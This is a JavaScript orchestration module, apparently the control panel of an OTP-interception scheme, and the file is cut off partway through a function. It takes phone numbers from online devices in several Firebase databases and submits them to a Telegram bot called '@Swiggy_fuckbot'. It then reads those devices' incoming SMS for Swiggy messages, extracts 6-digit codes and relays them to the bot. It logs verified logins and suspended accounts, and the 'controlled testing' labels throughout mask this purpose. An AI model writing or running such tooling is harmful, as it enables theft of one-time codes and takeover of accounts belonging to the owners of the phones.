/**
 * Automation Engine — Orchestration Layer for Controlled Testing & Python Worker Bridge
 *
 * Consumes existing infrastructure:
 * - discoveryEngine.connections (All configured Firebase DBs)
 * - withNumber() (Eligible online devices with numbers)
 * - getDisplayPhone() (Phone mapping with manual overrides)
 * - fetchAllDevices() (Database refresh)
 * - apiFetch() (Firebase REST client)
 * - extractNumber() (Phone normalization)
 * - registry (Persistent success protection)
 *
 * Never auto-starts on page reload.
 * Start requires pre-flight verification to pass.
 * Never reuses successful numbers automatically.
 */

import { apiFetch } from '$lib/firebase.js';
import { extractNumber } from '$lib/device-helpers.js';
import {
  engine as discoveryEngine,
  withNumber,
  onlineDevices,
  allDevices,
  getDisplayPhone,
  getDiscoveredPhone,
  fetchAllDevices
} from '$lib/discovery-engine.svelte.js';
import { registry } from '$lib/automation-registry.js';

// ── Constants & Helpers ──────────────────────────────────────────────────────
const CONFIG_KEY = 'automation_config:v1';
const MAX_LOGS = 250;

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function nowIST() {
  try {
    return new Date().toLocaleString('en-IN', {
      hour: '2-digit', minute: '2-digit', second: '2-digit',
      hour12: false, timeZone: 'Asia/Kolkata'
    });
  } catch {
    return new Date().toLocaleTimeString();
  }
}

// ── Reactive State (Singleton) ───────────────────────────────────────────────
export let autoEngine = $state({
  status: 'IDLE', // IDLE | PREFLIGHT | RUNNING | PAUSED | STOPPED | COMPLETED
  preflightPassed: false,
  preflightRunning: false,
  preflightResults: [],

  // Configuration
  config: {
    botUsername: '@Swiggy_fuckbot',
    apiId: '',
    apiHash: '',
    telegramPhone: '',
    otpTimeoutSeconds: 60,
    pollIntervalSeconds: 5,
    responseKeyword: 'swiggy',
    testMode: false,
    autoStopWhenEmpty: false,
    selectedConnId: 'all' // 'all' or specific connection id
  },

  // State machine & active execution
  jobState: 'IDLE', // IDLE | DISPATCHING | WAITING_FOR_NUMBER | WAITING_FOR_OTP | VERIFYING | COMPLETED | FAILED | TIMEOUT
  currentJob: null,
  activeJobs: [],
  usedDeviceKeys: [], // composite "database|deviceId" keys attempted in this session

  // Statistics
  stats: {
    totalProcessed: 0,
    success: 0,
    failed: 0,
    timeout: 0,
    skipped: 0
  },

  // Remote Python worker status sync
  workerStatus: {
    status: 'unknown',
    currentJob: null,
    phone: null,
    deviceId: null,
    database: null,
    lastUpdate: null,
    lastError: null,
    latestBotMessage: null
  },

  // Telegram account connection (via Firebase auth bridge)
  telegramAuth: {
    // DISCONNECTED | CONNECTING | WAITING_FOR_PHONE | WAITING_FOR_CODE
    // | WAITING_FOR_2FA | VERIFYING_CODE | VERIFYING_2FA | CONNECTED | ERROR
    status: 'DISCONNECTED',
    username: null,
    phone: null,
    connectedAt: null,
    hint2fa: '',
    error: null,
    lastUpdate: null
  },

  // Logs & timing
  logs: [],
  startedAt: null,
  elapsedSeconds: 0
});

// ── Internal Non-Reactive Variables ──────────────────────────────────────────
let loopTimer = null;
let otpTimeoutTimer = null;
let elapsedTimer = null;
let workerSyncTimer = null;
let isJobInProgress = false;

// ── Logging ──────────────────────────────────────────────────────────────────
export function addLog(message, type = 'info', meta = null) {
  const entry = {
    id: Date.now() + Math.random(),
    ts: nowIST(),
    message,
    type, // 'info' | 'success' | 'warn' | 'error' | 'step'
    meta
  };
  autoEngine.logs = [entry, ...autoEngine.logs].slice(0, MAX_LOGS);
}

export function clearLogs() {
  autoEngine.logs = [];
}

// ── Configuration Persistence & Sync ─────────────────────────────────────────
export async function loadConfig() {
  if (typeof window === 'undefined') return;

  // 1. Load from localStorage
  if (window.localStorage) {
    try {
      const raw = localStorage.getItem(CONFIG_KEY);
      if (raw) {
        const parsed = JSON.parse(raw);
        autoEngine.config = { ...autoEngine.config, ...parsed };
      }
    } catch (err) {
      console.warn('[AutomationEngine] Could not load localStorage config:', err);
    }
  }

  // 2. Load from server-side worker_config.json via API
  try {
    const res = await fetch('/api/worker-config');
    if (res.ok) {
      const data = await res.json();
      if (data && data.telegram) {
        const tg = data.telegram;
        autoEngine.config = {
          ...autoEngine.config,
          apiId: autoEngine.config.apiId || (tg.api_id ? String(tg.api_id) : ''),
          apiHash: autoEngine.config.apiHash || tg.api_hash || '',
          botUsername: autoEngine.config.botUsername || tg.bot_username || '',
          telegramPhone: autoEngine.config.telegramPhone || tg.phone || '',
          otpTimeoutSeconds: autoEngine.config.otpTimeoutSeconds || tg.otp_timeout || 60,
          responseKeyword: autoEngine.config.responseKeyword || tg.response_keyword || 'swiggy'
        };
      }
    }
  } catch (err) {
    // API endpoint optional
  }
}

export async function saveConfig() {
  if (typeof window === 'undefined') return;

  // 1. Save to localStorage
  if (window.localStorage) {
    try {
      localStorage.setItem(CONFIG_KEY, JSON.stringify(autoEngine.config));
    } catch (err) {
      console.warn('[AutomationEngine] Could not save config to localStorage:', err);
    }
  }

  // 2. Sync to local worker_config.json via server API
  try {
    await fetch('/api/worker-config', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        api_id: autoEngine.config.apiId,
        api_hash: autoEngine.config.apiHash,
        bot_username: autoEngine.config.botUsername,
        phone: autoEngine.config.telegramPhone,
        otp_timeout: autoEngine.config.otpTimeoutSeconds,
        response_keyword: autoEngine.config.responseKeyword
      })
    });
  } catch (err) {
    console.warn('[AutomationEngine] Could not sync to worker_config.json:', err);
  }

  // 3. Sync to Firebase automation/config
  const healthyConn = getHealthyPrimaryConn();
  if (healthyConn) {
    try {
      await apiFetch(healthyConn, 'automation/config', 'PUT', {
        botUsername: autoEngine.config.botUsername,
        apiId: autoEngine.config.apiId,
        apiHash: autoEngine.config.apiHash,
        phone: autoEngine.config.telegramPhone,
        otpTimeoutSeconds: autoEngine.config.otpTimeoutSeconds,
        responseKeyword: autoEngine.config.responseKeyword,
        updatedAt: new Date().toISOString()
      });
    } catch (_) {}
  }

  addLog('Configuration saved & synchronized to worker.', 'info');
}

export function updateConfig(updates) {
  autoEngine.config = { ...autoEngine.config, ...updates };
  saveConfig();
}

export function getHealthyPrimaryConn() {
  const enabledConns = discoveryEngine.connections.filter(c => c.enabled);
  if (enabledConns.length === 0) return null;
  // If user selected a specific connection, try that if not in error
  if (autoEngine.config.selectedConnId && autoEngine.config.selectedConnId !== 'all') {
    const selected = enabledConns.find(c => c.id === autoEngine.config.selectedConnId);
    if (selected && !discoveryEngine.db[selected.id]?.error) return selected;
  }
  // Otherwise pick the first healthy connection (not deactivated / no error)
  const healthy = enabledConns.find(c => !discoveryEngine.db[c.id]?.error);
  return healthy || enabledConns[0];
}

// ── Emergency Worker Control Signals ─────────────────────────────────────────
export async function sendControlAction(action, payload = {}) {
  const conn = getHealthyPrimaryConn();
  if (!conn) {
    addLog(`Cannot send '${action}': no active Firebase database`, 'warn');
    return false;
  }

  const body = {
    action,
    timestamp: new Date().toISOString(),
    ...payload
  };

  let sent = false;
  try {
    await apiFetch(conn, 'automation/control', 'PUT', body);
    sent = true;
    addLog(`Sent '${action}' control signal to Python worker via ${conn.name || conn.id}.`, 'step');
  } catch (err) {
    addLog(`Failed to send '${action}' to ${conn.name || conn.id}: ${err.message}`, 'error');
    if (discoveryEngine.db[conn.id]) {
      discoveryEngine.db[conn.id].error = err.message;
    }
    // Attempt fallback to next available healthy connection
    const fallback = discoveryEngine.connections.find(c => c.enabled && c.id !== conn.id && !discoveryEngine.db[c.id]?.error);
    if (fallback) {
      try {
        await apiFetch(fallback, 'automation/control', 'PUT', body);
        sent = true;
        addLog(`Sent '${action}' control signal via fallback ${fallback.name || fallback.id}.`, 'step');
      } catch (_) {}
    }
  }

  // Also broadcast to other healthy connections so worker detects it regardless of probed DB
  const otherConns = discoveryEngine.connections.filter(c => c.enabled && c.id !== conn.id && !discoveryEngine.db[c.id]?.error).slice(0, 3);
  for (const oc of otherConns) {
    apiFetch(oc, 'automation/control', 'PUT', body).catch(() => {});
  }

  return sent;
}

export async function forceBotStart() {
  return sendControlAction('start');
}

export async function forceBotCancel() {
  if (autoEngine.jobState !== 'IDLE') {
    addLog(`[UI Cancel] Reset active job state (${autoEngine.jobState}) to IDLE.`, 'warn');
    autoEngine.jobState = 'IDLE';
    autoEngine.currentJob = null;
    isJobInProgress = false;
  }
  return sendControlAction('cancel');
}

export async function skipCurrentJob() {
  if (autoEngine.jobState !== 'IDLE') {
    addLog(`[UI Skip] Skipping active job (${autoEngine.jobState})...`, 'warn');
    autoEngine.jobState = 'IDLE';
    autoEngine.currentJob = null;
    isJobInProgress = false;
  }
  return sendControlAction('skip');
}

export async function sendBotCommand(text) {
  const cmd = String(text || '').trim();
  if (!cmd) return false;
  addLog(`Sending direct command to Telegram bot: '${cmd}'`, 'step');
  return sendControlAction('send', { text: cmd });
}

// ── Pre-flight Verification ──────────────────────────────────────────────────
/**
 * Verifies that all required systems are ready before starting.
 * Start is only unlocked when preflight passes.
 */
export async function runPreflight() {
  autoEngine.preflightRunning = true;
  autoEngine.preflightPassed = false;
  autoEngine.preflightResults = [];
  addLog('Starting pre-flight system diagnostics...', 'step');

  const results = [];

  // Check 1: Firebase databases configured
  const enabledConns = discoveryEngine.connections.filter(c => c.enabled);
  if (enabledConns.length > 0) {
    results.push({
      name: 'Firebase Databases',
      status: 'pass',
      message: `${enabledConns.length} database(s) active & enabled`
    });
  } else {
    results.push({
      name: 'Firebase Databases',
      status: 'fail',
      message: 'No enabled Firebase databases found. Configure connections first.'
    });
  }

  // Check 2: Refresh and verify device pool
  addLog('Refreshing device data across all configured databases...', 'info');
  try {
    await fetchAllDevices();
    results.push({
      name: 'Device Cache Refresh',
      status: 'pass',
      message: 'Successfully polled all configured databases'
    });
  } catch (err) {
    results.push({
      name: 'Device Cache Refresh',
      status: 'warn',
      message: `Polling warning: ${err.message || 'Partial response'}`
    });
  }

  // Check 3: Eligible candidate devices (Discovered numbers + Online numbers)
  const allEligible = getAllEligibleDevices();
  const unusedEligible = allEligible.filter(d => {
    if (autoEngine.usedDeviceKeys.includes(d.compKey)) return false;
    if (registry.isAlreadyProcessed(d.normalizedPhone)) return false;
    return true;
  });

  const discoveredCount = allEligible.filter(d => d.source === 'discovered').length;
  const onlineCount = allEligible.filter(d => d.source === 'online').length;

  if (unusedEligible.length > 0) {
    results.push({
      name: 'Eligible Numbers Pool',
      status: 'pass',
      message: `${unusedEligible.length} unused candidate(s) ready (${onlineCount} online, ${discoveredCount} discovered, ${allEligible.length} total)`
    });
  } else if (allEligible.length > 0) {
    results.push({
      name: 'Eligible Numbers Pool',
      status: 'warn',
      message: `All ${allEligible.length} discovered/online numbers are already processed. Manual reset required to re-run.`
    });
  } else {
    results.push({
      name: 'Eligible Numbers Pool',
      status: 'fail',
      message: 'No online or discovered devices with phone numbers found yet. Run Discovery or wait for devices to come online.'
    });
  }

  // Check 4: Firebase RTDB write test on reachable database
  if (enabledConns.length > 0) {
    // Prioritize healthy connections (those without a 423 or deactivated error)
    const healthyConns = enabledConns.filter(c => !discoveryEngine.db[c.id]?.error);
    const probeCandidates = healthyConns.length > 0 ? healthyConns : enabledConns;

    let bridgeVerified = false;
    let lastError = '';

    for (const conn of probeCandidates) {
      try {
        const pingPayload = {
          timestamp: new Date().toISOString(),
          client: 'automation-preflight-check',
          status: 'ready'
        };
        const writeRes = await apiFetch(conn, 'automation/preflight', 'PUT', pingPayload);
        if (writeRes && !writeRes.error) {
          results.push({
            name: 'Firebase RTDB Bridge Path',
            status: 'pass',
            message: `Read/write verified on ${conn.name || conn.id} (automation/preflight)`
          });
          bridgeVerified = true;
          break;
        } else {
          lastError = writeRes?.error || `Status ${writeRes?.status}`;
        }
      } catch (err) {
        lastError = err.message;
        // If this specific database failed or was deactivated (HTTP 423), continue to next
        continue;
      }
    }

    if (!bridgeVerified) {
      results.push({
        name: 'Firebase RTDB Bridge Path',
        status: 'warn',
        message: `Bridge path write notice: ${lastError || 'Auth token may be required for writes'}`
      });
    }
  }

  // Check 5: Live Production Mode & Keyword
  results.push({
    name: 'Automation Mode',
    status: 'pass',
    message: `Live Production Flow active. Target response keyword: "${autoEngine.config.responseKeyword || 'swiggy'}"`
  });

  // Check 6: Telegram bot username configuration
  const botUser = (autoEngine.config.botUsername || '').trim();
  if (botUser.length > 2) {
    results.push({
      name: 'Telegram Bot Target',
      status: 'pass',
      message: `Configured target bot: @${botUser.replace(/^@/, '')}`
    });
  } else {
    results.push({
      name: 'Telegram Bot Target',
      status: 'fail',
      message: 'Telegram bot username is empty. Please set bot username in Configuration.'
    });
  }

  // Check 7: Telegram API Credentials
  const apiId = String(autoEngine.config.apiId || '').trim();
  const apiHash = String(autoEngine.config.apiHash || '').trim();
  if (apiId && apiHash) {
    results.push({
      name: 'Telegram API Credentials',
      status: 'pass',
      message: `API ID (${apiId}) & API Hash configured locally`
    });
  } else if (autoEngine.telegramAuth.status === 'CONNECTED' || autoEngine.workerStatus.status !== 'unknown') {
    results.push({
      name: 'Telegram API Credentials',
      status: 'pass',
      message: 'Using active session / worker environment credentials'
    });
  } else {
    results.push({
      name: 'Telegram API Credentials',
      status: 'warn',
      message: 'API ID / Hash not set in UI. Using worker defaults from .env if present.'
    });
  }

  autoEngine.preflightResults = results;
  const hasFails = results.some(r => r.status === 'fail');
  autoEngine.preflightPassed = !hasFails;
  autoEngine.preflightRunning = false;

  if (autoEngine.preflightPassed) {
    addLog('Pre-flight checks passed! Live automation is now unlocked.', 'success');
  } else {
    addLog('Pre-flight checks failed. Please resolve the errors before starting.', 'error');
  }

  return autoEngine.preflightPassed;
}

// ── Device & Discovered Numbers Selection ────────────────────────────────────
/**
 * Gathers ALL candidates matching "Online + Numbers" (from dashboard filter):
 * 1. Must be ONLINE (isOnline(dev.info) === true)
 * 2. Must have a valid phone number from:
 *    - Existing SIM/carrier number (fmtPhone)
 *    - Locally saved number override (localPhones)
 *    - Discovered number from discovery engine (records with status 'discovered')
 * If a device is online but has no number, it is NOT eligible until its number is discovered.
 * If a device is offline, it is NOT eligible.
 */
export function getAllEligibleDevices() {
  const connFilter = autoEngine.config.selectedConnId;
  const list = [];
  const seenPhones = new Set();
  const seenKeys = new Set();

  // 1. Build lookup of discovered numbers by deviceKey
  const discoveredMap = new Map();
  if (Array.isArray(discoveryEngine.records)) {
    for (const rec of discoveryEngine.records) {
      if (rec.status === 'discovered' && rec.phoneNumber && rec.deviceId) {
        discoveredMap.set(rec.deviceId, rec.phoneNumber);
      }
    }
  }

  // 2. Iterate ONLY through ONLINE devices
  const onlinePool = onlineDevices();
  for (const dev of onlinePool) {
    if (connFilter && connFilter !== 'all' && dev.connId !== connFilter) continue;

    // Check SIM / local override first
    const displayPhone = getDisplayPhone(dev.connId, dev.key, dev.info);
    const discoveredPhone = discoveredMap.get(dev.key);

    let rawPhone = '';
    let source = 'online';

    if (displayPhone && extractNumber(displayPhone).length >= 10) {
      rawPhone = displayPhone;
      source = 'online';
    } else if (discoveredPhone && extractNumber(discoveredPhone).length >= 10) {
      rawPhone = discoveredPhone;
      source = 'discovered';
    } else {
      // If number is not there for a device and is online, it is NOT eligible until discovered
      continue;
    }

    const normalized = extractNumber(rawPhone);
    if (!normalized || normalized.length < 10) continue;

    // Ensure uniqueness across the candidate pool by 10-digit number
    if (seenPhones.has(normalized)) continue;

    const compKey = `${dev.conn.url || dev.connId}|${dev.key}`;
    seenPhones.add(normalized);
    seenKeys.add(compKey);

    list.push({
      dev,
      rawPhone,
      normalizedPhone: normalized,
      compKey,
      deviceId: dev.key,
      conn: dev.conn,
      connId: dev.connId,
      info: dev.info,
      source
    });
  }

  return list;
}

/**
 * Selects the next eligible device consuming the full candidate pool.
 * Never selects already successful numbers or previously used devices.
 */
export function selectNextDevice(manualConnId = null) {
  const allCandidates = getAllEligibleDevices();
  for (const cand of allCandidates) {
    if (manualConnId && manualConnId !== 'all' && cand.connId !== manualConnId) continue;
    // Session exclusion
    if (autoEngine.usedDeviceKeys.includes(cand.compKey)) continue;
    // Persistent protection — never re-test processed numbers automatically in a loop
    if (registry.isAlreadyProcessed(cand.normalizedPhone)) continue;
    return cand;
  }
  return null;
}

// ── Controlled Test Response Poller ──────────────────────────────────────────
/**
 * Polls Firebase for incoming test responses matching the test keyword (Swiggy).
 * Extracts 6-digit candidate codes (?<!\d)\d{6}(?!\d).
 */
async function captureTestResponseBaseline(conn, deviceId) {
  const baselineSignatures = new Set();
  const paths = [
    `messages/${deviceId}`,
    `automation/testResponses/${deviceId}`,
    `automation/notifications/${deviceId}`,
    deviceId
  ];

  for (const path of paths) {
    try {
      const res = await apiFetch(conn, path, 'GET');
      if (res && res.data && typeof res.data === 'object') {
        const msgs = extractMatchingMessages(res.data, autoEngine.config.responseKeyword);
        for (const m of msgs) {
          baselineSignatures.add(`${path}::${m.id}`);
        }
      }
    } catch {
      // ignore baseline errors
    }
  }

  return baselineSignatures;
}

function extractMatchingMessages(val, keyword) {
  const matches = [];
  if (!val || typeof val !== 'object') return matches;

  const kw = (keyword || 'swiggy').toLowerCase();

  for (const [msgId, record] of Object.entries(val)) {
    if (!record || typeof record !== 'object') continue;
    const body = String(record.message || record.body || record.text || record.msg || '');
    if (body.toLowerCase().includes(kw)) {
      matches.push({
        id: String(msgId),
        message: body,
        sender: record.sender || record.from || '',
        dateTime: record.dateTime || record.timestamp || ''
      });
    }
  }

  return matches;
}

function extract6DigitCode(text) {
  if (!text) return null;
  // Match standalone 6-digit number
  const regex = /(?:^|\D)(\d{6})(?!\d)/g;
  const found = [];
  let m;
  while ((m = regex.exec(text)) !== null) {
    found.push(m[1]);
  }
  return found.length === 1 ? found[0] : null;
}

async function pollForControlledTestCode(conn, deviceId, baselineSignatures, deadlineMs) {
  const paths = [
    `messages/${deviceId}`,
    `automation/testResponses/${deviceId}`,
    `automation/notifications/${deviceId}`,
    deviceId
  ];

  while (Date.now() < deadlineMs && autoEngine.status === 'RUNNING') {
    for (const path of paths) {
      try {
        const res = await apiFetch(conn, path, 'GET');
        if (res && res.data && typeof res.data === 'object') {
          const msgs = extractMatchingMessages(res.data, autoEngine.config.responseKeyword);
          for (const m of msgs) {
            const sig = `${path}::${m.id}`;
            if (!baselineSignatures.has(sig)) {
              addLog(`New matching message detected at ${path} (ID: ${m.id})`, 'info');
              baselineSignatures.add(sig);

              const code = extract6DigitCode(m.message);
              if (code) {
                return { code, message: m.message, path, msgId: m.id };
              } else {
                addLog(`Message received but could not extract unique 6-digit code: "${m.message.slice(0, 40)}..."`, 'warn');
              }
            }
          }
        }
      } catch (err) {
        // network polling retry
      }
    }

    await sleep(2500);
  }

  return null;
}

// ── Remote Worker Status Sync ────────────────────────────────────────────────
export async function syncWorkerStatus() {
  const primary = getHealthyPrimaryConn();
  const connsToCheck = primary
    ? [primary, ...discoveryEngine.connections.filter(c => c.enabled && c.id !== primary.id)]
    : discoveryEngine.connections.filter(c => c.enabled);

  if (connsToCheck.length === 0) return;

  let bestStatus = null;
  let newestTime = 0;

  for (const conn of connsToCheck.slice(0, 6)) {
    try {
      const res = await apiFetch(conn, 'automation/worker', 'GET');
      if (res && res.data && typeof res.data === 'object') {
        const updateStr = res.data.lastUpdate || res.data.timestamp || '';
        const updateTime = updateStr ? new Date(updateStr).getTime() : 0;
        if (!bestStatus || updateTime > newestTime) {
          newestTime = updateTime;
          bestStatus = {
            conn,
            data: res.data
          };
        }
      }
    } catch {
      // try next connection
    }
  }

  if (bestStatus) {
    const d = bestStatus.data;
    autoEngine.workerStatus = {
      status: d.status || 'idle',
      currentJob: d.currentJob || null,
      phone: d.phone || null,
      deviceId: d.deviceId || null,
      database: d.database || null,
      lastUpdate: d.lastUpdate || d.timestamp || null,
      lastError: d.lastError || null,
      latestBotMessage: d.latestBotMessage || null
    };

    // Also sync telegram auth from this same connection
    try {
      const authRes = await apiFetch(bestStatus.conn, 'automation/auth', 'GET');
      if (authRes && authRes.data && typeof authRes.data === 'object') {
        const ad = authRes.data;
        const rawStatus = (ad.status || 'disconnected').toLowerCase();
        const uiStatus = {
          connecting:        'CONNECTING',
          waiting_for_phone: 'WAITING_FOR_CODE',
          waiting_for_code:  'WAITING_FOR_CODE',
          verifying_code:    'VERIFYING_CODE',
          waiting_for_2fa:   'WAITING_FOR_2FA',
          verifying_2fa:     'VERIFYING_2FA',
          connected:         'CONNECTED',
          error:             'ERROR',
        }[rawStatus] || 'DISCONNECTED';
        autoEngine.telegramAuth = {
          status: uiStatus,
          username: ad.username || null,
          phone: ad.phone || null,
          connectedAt: ad.connectedAt || null,
          hint2fa: ad.hint || '',
          error: ad.error || null,
          lastUpdate: ad.updatedAt || null
        };
      }
    } catch {
      // auth sync is best-effort
    }
  }
}

// ── Telegram Account Connection ───────────────────────────────────────────────

/**
 * Initiates a new Telegram connection by writing credentials to Firebase.
 * The Python worker's Telethon callbacks will pick them up.
 *
 * @param {string} phone - The user's Telegram phone number (e.g. +919876543210)
 */
export async function connectTelegram(phone) {
  const enabledConns = discoveryEngine.connections.filter(c => c.enabled);
  if (enabledConns.length === 0) {
    addLog('Cannot connect Telegram: no Firebase databases configured.', 'error');
    return false;
  }
  const conn = enabledConns[0];

  addLog(`Initiating Telegram connection for ${phone}...`, 'step');
  autoEngine.telegramAuth.status = 'CONNECTING';
  autoEngine.telegramAuth.error = null;

  try {
    // Clear any stale auth fields first, then write phone to trigger worker
    await apiFetch(conn, 'automation/auth', 'PUT', {
      status: 'connecting',
      phone: phone,
      code: null,
      password: null,
      error: null,
      updatedAt: new Date().toISOString()
    });
    addLog('Credentials written to Firebase. Waiting for worker to initiate auth...', 'info');
    return true;
  } catch (err) {
    autoEngine.telegramAuth.status = 'ERROR';
    autoEngine.telegramAuth.error = err.message || 'Failed to write auth request to Firebase';
    addLog(`Telegram connect failed: ${err.message}`, 'error');
    return false;
  }
}

/**
 * Submits the Telegram verification code received by the user to Firebase.
 * The Python worker's code_callback is blocking on this field.
 */
export async function submitAuthCode(code) {
  const enabledConns = discoveryEngine.connections.filter(c => c.enabled);
  if (enabledConns.length === 0) return false;
  const conn = enabledConns[0];

  addLog(`Submitting verification code to Firebase bridge...`, 'step');
  autoEngine.telegramAuth.status = 'VERIFYING_CODE';

  try {
    await apiFetch(conn, 'automation/auth', 'PATCH', {
      code: String(code).trim(),
      updatedAt: new Date().toISOString()
    });
    addLog('Verification code submitted. Worker will verify...', 'info');
    return true;
  } catch (err) {
    autoEngine.telegramAuth.status = 'ERROR';
    autoEngine.telegramAuth.error = err.message;
    addLog(`Code submission failed: ${err.message}`, 'error');
    return false;
  }
}

/**
 * Submits the 2FA password to Firebase so the Telethon 2FA callback can consume it.
 */
export async function submitTwoFA(password) {
  const enabledConns = discoveryEngine.connections.filter(c => c.enabled);
  if (enabledConns.length === 0) return false;
  const conn = enabledConns[0];

  addLog('Submitting 2FA password to Firebase bridge...', 'step');
  autoEngine.telegramAuth.status = 'VERIFYING_2FA';

  try {
    await apiFetch(conn, 'automation/auth', 'PATCH', {
      password: String(password).trim(),
      updatedAt: new Date().toISOString()
    });
    addLog('2FA password submitted. Worker will verify...', 'info');
    return true;
  } catch (err) {
    autoEngine.telegramAuth.status = 'ERROR';
    autoEngine.telegramAuth.error = err.message;
    addLog(`2FA submission failed: ${err.message}`, 'error');
    return false;
  }
}

/**
 * Clears the automation/auth path in Firebase (disconnect/reset).
 */
export async function disconnectTelegram() {
  const enabledConns = discoveryEngine.connections.filter(c => c.enabled);
  autoEngine.telegramAuth = {
    status: 'DISCONNECTED', username: null, phone: null,
    connectedAt: null, hint2fa: '', error: null, lastUpdate: null
  };
  if (enabledConns.length === 0) return;
  const conn = enabledConns[0];
  try {
    await apiFetch(conn, 'automation/auth', 'PUT', {
      status: 'disconnected', phone: null, code: null,
      password: null, username: null, error: null,
      updatedAt: new Date().toISOString()
    });
    addLog('Telegram auth state cleared.', 'info');
  } catch {
    // best-effort
  }
}

// ── Core Job Processor ───────────────────────────────────────────────────────
export async function executeJobForDevice(selection, isManual = false) {
  if (isJobInProgress) return;
  isJobInProgress = true;

  const { dev, normalizedPhone, compKey, deviceId, conn } = selection;

  // Mark device as used in this session immediately
  if (!autoEngine.usedDeviceKeys.includes(compKey)) {
    autoEngine.usedDeviceKeys = [...autoEngine.usedDeviceKeys, compKey];
  }

  const jobId = `job-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
  const job = {
    id: jobId,
    jobId,
    deviceId,
    database: conn.url,
    connId: dev.connId,
    phone: normalizedPhone,
    status: 'queued',
    createdAt: new Date().toISOString(),
    isManual
  };

  autoEngine.currentJob = job;
  autoEngine.jobState = 'DISPATCHING';
  addLog(`[${jobId}] Selected device ${deviceId} (${normalizedPhone}) from ${conn.name || dev.connId}`, 'step');

  // Push job to Firebase automation/jobs/{jobId}
  const jobPayload = {
    number: normalizedPhone,
    deviceId,
    database: conn.url,
    status: 'queued',
    createdAt: job.createdAt
  };

  try {
    await apiFetch(conn, `automation/jobs/${jobId}`, 'PUT', jobPayload);
    // Also push to primary database (auth_db / ranu) so worker claims it in <200ms
    const primary = getHealthyPrimaryConn();
    if (primary && primary.id !== conn.id) {
      try {
        await apiFetch(primary, `automation/jobs/${jobId}`, 'PUT', jobPayload);
      } catch {}
    }
    addLog(`[${jobId}] Dispatched job to Firebase queue`, 'info');
  } catch (err) {
    addLog(`[${jobId}] Notice: Could not sync job to Firebase: ${err.message}`, 'warn');
  }

  // Monitor the job status in Firebase as executed by the Python Telegram worker
  const startTime = Date.now();
  const maxWaitMs = ((autoEngine.config.otpTimeoutSeconds || 40) + 30) * 1000;
  const deadline = startTime + maxWaitMs;

  let lastStatus = 'queued';
  let claimedByWorker = false;
  let jobResolved = false;

  addLog(`[${jobId}] Dispatched job to Firebase queue. Awaiting Python worker...`, 'info');

  while (Date.now() < deadline && (autoEngine.status === 'RUNNING' || isManual) && !jobResolved) {
    let res;
    try {
      res = await apiFetch(conn, `automation/jobs/${jobId}`, 'GET');
      if (!res?.data || res.data.status === 'queued') {
        const primary = getHealthyPrimaryConn();
        if (primary && primary.id !== conn.id) {
          const pRes = await apiFetch(primary, `automation/jobs/${jobId}`, 'GET');
          if (pRes?.data && pRes.data.status !== 'queued') {
            res = pRes;
          }
        }
      }
    } catch {
      // transient network hiccup, retry
    }

    const jobData = res?.data;
    if (jobData && typeof jobData === 'object') {
      const status = String(jobData.status || 'queued').toLowerCase().trim();

      if (status !== lastStatus) {
        lastStatus = status;
        syncWorkerStatus().catch(() => {});

        if (status === 'processing') {
          claimedByWorker = true;
          autoEngine.jobState = 'DISPATCHING';
          addLog(`[${jobId}] Worker claimed job. Preparing Telegram flow...`, 'step');
        } else if (status === 'waiting_for_number') {
          claimedByWorker = true;
          autoEngine.jobState = 'WAITING_FOR_NUMBER';
          addLog(`[${jobId}] Worker submitted number ${normalizedPhone} to Telegram bot`, 'step');
        } else if (status === 'waiting_for_otp') {
          claimedByWorker = true;
          autoEngine.jobState = 'WAITING_FOR_OTP';
          addLog(`[${jobId}] Telegram bot sent OTP challenge. Worker polling Firebase for Swiggy OTP (cross-device)...`, 'step');
        } else if (status === 'verifying') {
          claimedByWorker = true;
          autoEngine.jobState = 'VERIFYING';
          addLog(`[${jobId}] Matching Swiggy message detected! Worker submitting 6-digit OTP to Telegram...`, 'step');
        } else if (status === 'success' || status === 'successful' || status === 'completed') {
          claimedByWorker = true;
          autoEngine.jobState = 'COMPLETED';
          job.status = 'success';
          autoEngine.stats.success += 1;
          autoEngine.stats.totalProcessed += 1;

          // PERSIST SUCCESS: Successful numbers are protected and never retried automatically
          registry.markSuccess(normalizedPhone, {
            deviceId,
            database: conn.url,
            jobId,
            reason: 'Verified via Python Telegram worker'
          });

          addLog(`[${jobId}] SUCCESS: Login verified! Saved ${normalizedPhone} to persistent registry.`, 'success');
          jobResolved = true;
          break;
        } else if (status === 'timeout' || status === 'expired') {
          claimedByWorker = true;
          autoEngine.jobState = 'TIMEOUT';
          job.status = 'expired';
          autoEngine.stats.timeout += 1;
          autoEngine.stats.totalProcessed += 1;

          registry.markNumber(normalizedPhone, 'expired', {
            deviceId,
            database: conn.url,
            jobId,
            reason: jobData.error || 'OTP expired after retry'
          });

          addLog(`[${jobId}] Worker reported OTP expired / timeout for ${normalizedPhone}. Saved to numbers log.`, 'error');
          jobResolved = true;
          break;
        } else if (status === 'suspended') {
          claimedByWorker = true;
          autoEngine.jobState = 'FAILED';
          job.status = 'suspended';
          autoEngine.stats.failed += 1;
          autoEngine.stats.totalProcessed += 1;

          registry.markNumber(normalizedPhone, 'suspended', {
            deviceId,
            database: conn.url,
            jobId,
            reason: jobData.error || 'Account suspended'
          });

          addLog(`[${jobId}] Worker reported account suspended for ${normalizedPhone}. Saved to numbers log.`, 'error');
          jobResolved = true;
          break;
        } else if (status === 'rate_limited') {
          claimedByWorker = true;
          autoEngine.jobState = 'FAILED';
          job.status = 'rate_limited';
          autoEngine.stats.failed += 1;
          autoEngine.stats.totalProcessed += 1;

          registry.markNumber(normalizedPhone, 'rate_limited', {
            deviceId,
            database: conn.url,
            jobId,
            reason: jobData.error || 'Rate limit / retry later'
          });

          addLog(`[${jobId}] Worker reported rate limit for ${normalizedPhone}. Saved to numbers log.`, 'error');
          jobResolved = true;
          break;
        } else if (status === 'failed' || status === 'cancelled' || status === 'stopped') {
          claimedByWorker = true;
          autoEngine.jobState = 'FAILED';
          job.status = status;
          autoEngine.stats.failed += 1;
          autoEngine.stats.totalProcessed += 1;

          registry.markNumber(normalizedPhone, 'failed', {
            deviceId,
            database: conn.url,
            jobId,
            reason: jobData.error || `Test ${status}`
          });

          addLog(`[${jobId}] Worker reported ${status} for ${normalizedPhone}: ${jobData.error || `Job ${status}`}`, 'error');
          jobResolved = true;
          break;
        }
      }
    }

    // Worker warning if unclaimed after 12s
    const elapsed = Date.now() - startTime;
